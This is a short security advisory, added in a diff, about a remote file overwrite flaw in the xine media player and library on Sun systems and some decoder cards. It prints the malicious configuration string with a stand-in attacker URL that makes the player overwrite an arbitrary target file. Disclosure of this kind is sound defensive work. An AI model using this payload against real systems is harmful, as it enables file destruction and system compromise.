@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/10193/info
+
+It has been reported that the xine media player and the xine media library are affected by multiple remote file overwrite vulnerabilities. This is due to a design error that allows various media resource file configurations to write to arbitrary files.
+
+It is possible to set these configuration parameters to write to arbitrary files on the affected system. It should be noted that this issue, as it is currently known, only affects Sun based systems as well as those using the DXR3 or Hollywood+ MPEG decoder audio card. It has been conjectured however that similar configuration parameters exists that affect other systems.
+
+The configuration syntax:
+
+"cfg:/audio.sun_audio_device:targetFile" 
+
+If followed by the entry:
+
+"http://www.example.com/attackerSpecifiedFile"
+
+Will cause the attacker specified file to be written to the target file.
